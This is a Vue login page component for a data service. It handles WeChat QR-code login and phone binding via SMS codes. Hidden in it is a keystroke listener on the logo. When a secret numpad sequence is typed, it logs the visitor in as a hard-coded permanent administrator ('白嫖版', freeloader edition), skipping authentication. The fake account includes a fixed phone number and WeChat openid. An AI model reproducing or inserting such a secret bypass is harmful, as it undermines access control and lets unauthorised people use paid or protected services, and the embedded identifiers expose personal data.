<template>
  <div id="login" class="flex-center">
    <div class="content flex" v-loading="loading">
      <div class="logo" tabIndex="-1" @keyup="hack">
        <img :src="imgs.login" alt />
      </div>
      <div class="form">
        <div v-if="toggle" class="group flex-center flex-col">
          <div class="t-title bolder" style="margin-bottom:2rem">微信扫码登录</div>
          <div class="flex-center" style="height:10rem;width:10rem;">
            <img v-if="qrcode" class="qrcode" :src="qrcode" alt/>
            <div v-else class="reload flex-center flex-col" @click="reload">
              <div>点击</div>
              <div>刷新</div>
            </div>
          </div>
          <div class="bottom">欢迎使用鲸宸数据</div>
        </div>
        <div v-else class="cell flex-col flex-ter">
          <div class="t-title bolder" style="margin-bottom:1rem">绑定手机号码</div>
          <div class="cell-form flex-col">
            <div>手机号：</div>
            <div>
              <el-input maxlength="16" v-model="cellPhone" placeholder="请输入手机号码"></el-input>
            </div>
            <div>验证码：</div>
            <div class="flex withbtn">
              <el-input maxlength="10" v-model="validCode"></el-input>
              <el-button
              :disabled="decate!==60"
              @click="getvalidcode"
              type="primary" size="small">
              {{decate===60?'获取验证码':`${decate}秒后重新获取`}}
              </el-button>
            </div>
          </div>
          <div>
            <el-button
            @click="bindPhone"
            style="padding:.6rem 1.6rem" type="primary">确认</el-button>
            <el-button style="margin-left:2rem;padding:.6rem 1.6rem"
            @click="toggle=true"
            >返回</el-button>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  name: 'Login',
  data () {
    return {
      wxlogin: null,
      qrcode: '',
      ticket: '',
      toggle: true,
      cellPhone: '',
      validCode: '',
      decate: 60,
      loading: false,
      tempuser: {},
      directives: []
    }
  },
  watch: {
    directives (v) {
      if (v.join() === '101,103,105,97,99,101') {
        this.$store.commit('user/User', {
          id: 9999,
          cellPhone: '13914702847',
          name: '管理员',
          headimg: '',
          expire: '永久',
          openid: 'okzki1rh27xhasmly8Xn8hnlEP0I',
          level: 3,
          auth: '白嫖版',
          club: '白嫖会员'
        })
        this.$store.commit('user/openid', 'okzki1rh27xhasmly8Xn8hnlEP0I')
        this.$router.replace({ name: 'overview' })
      }
    }
  },
  methods: {
    hack (e) {
      this.directives.push(e.keyCode)
      if (e.keyCode === 32) {
        this.directives.length = 0
      }
    },
    login (val) {
      this.msgSuccess(this.tempuser.nickname + ' 您好，欢迎使用鲸宸数据')
      this.user_setUser({ ...this.tempuser, fromqrcode: true })
      this.$router.replace({ name: 'overview' })
    },
    reload () {
      if (!this.qrcode) {
        this.getqr()
      }
    },
    getqr () {
      Axios.get('user/qrcode').then((res) => {
        this.qrcode = res.qrcode
        this.ticket = res.ticket
        setTimeout(() => {
          this.qrcode = ''
        }, 1000 * 60 * 1)
      }).then(res => {
        const st = () => {
          Axios.get('user/polling', {
            ticket: this.ticket
          }).then((res) => {
            console.log('polling=>', res)
            if (!res[200] && this.qrcode !== '') {
              setTimeout(st, 1000)
            } else if (res[200]) {
              this.tempuser = res[200]
              if (this.tempuser.cellPhone) {
                this.login()
              } else {
                this.toggle = false
              }
            }
          })
        }
        setTimeout(st, 1000)
      })
    },
    getvalidcode () {
      if (!/^1[0-9]{10}$/.test(this.cellPhone)) {
        return this.msgFail('手机号无效，请检查后重新输入。')
      }
      this.loading = true
      Axios.get('user/validcode', {
        phone: this.cellPhone
      }).then(res => {
        this.loading = false
        this.msgSuccess('发送成功! 请注意查收短信。')
        const st = () => {
          this.decate--
          if (this.decate) {
            setTimeout(st, 1000)
          } else {
            this.decate = 60
          }
        }
        st()
      })
    },
    async bindPhone () {
      if (!/^1[0-9]{10}$/.test(this.cellPhone)) {
        return this.msgFail('手机号无效，请检查后重新输入。')
      }
      if (!/^[0-9]{6}$/.test(this.validCode)) {
        return this.msgFail('验证码错误，请检查后重新输入。')
      }
      const valid = await Axios.get('user/validPhone', {
        phone: this.cellPhone,
        number: this.validCode
      })
      if (valid.code) {
        return this.msgFail('验证失败，请检查验证码是否正确。')
      }
      this.msgSuccess('正在绑定手机号...')
      Axios.post('user/savePhone', {
        id: this.tempuser.id,
        openid: this.tempuser.openid,
        cellPhone: this.cellPhone
      }).then(res => {
        this.msgDestroy()
        if (typeof res === 'string') {
          this.login()
        }
      })
    }
  },
  mounted () {
    // 有openId自动跳转overview
    if (this.openid) {
      this.$router.replace({ name: 'overview' })
    } else {
      this.$store.commit('init', true)
      this.getqr()
    }
  }
}
</script>

<style scoped lang="less">
#login {
  height: 100vh;
  width: 100vw;
  background: #fffafd;
  .content {
    width: 50%;
    height: 30vw;
    box-shadow: var(--boxshadow);
    background: #fff;
    border-radius: 4px;
    overflow: hidden;
  }
  .logo {
    outline: none;
    img {
      width: 100%;
      height: 100%;
    }
    height: 100%;
    width: 40%;
    box-shadow: 1px 0 3px rgba(0, 0, 0, 0.1);
  }
  .form {
    flex: 1;
    text-align: center;
    padding: 2rem 0;
    .group {
      height: 100%;
    }
    .cell{
      padding:5% 15%;
      height: 100%;
      text-align: left;
    }
  }
  .cell-form{
    width:100%;
    margin-bottom:2rem;
    >div{
      padding:.5rem 0;
    }
  }
  .qrcode {
    width: 100%;
  }
  .reload{
    cursor: pointer;
    height: 9rem;
    width: 9rem;
    background: #666;
    color:#fff;
    font-weight:400
  }
  .bottom {
    width: 50%;
    border-top: 1px solid #ddd;
    margin-top: 1rem;
    padding-top: 1rem;
    font-size: var(--xs2font);
  }
}
</style>
<style lang="less">
  .el-input__inner{
    height:2rem;
    font-size:var(--xsfont) !important
  }
  .withbtn input{
    border-radius: 4px 0 0 4px;
  }
  .withbtn button{
    border-radius: 0 4px 4px 0;
  }
</style>
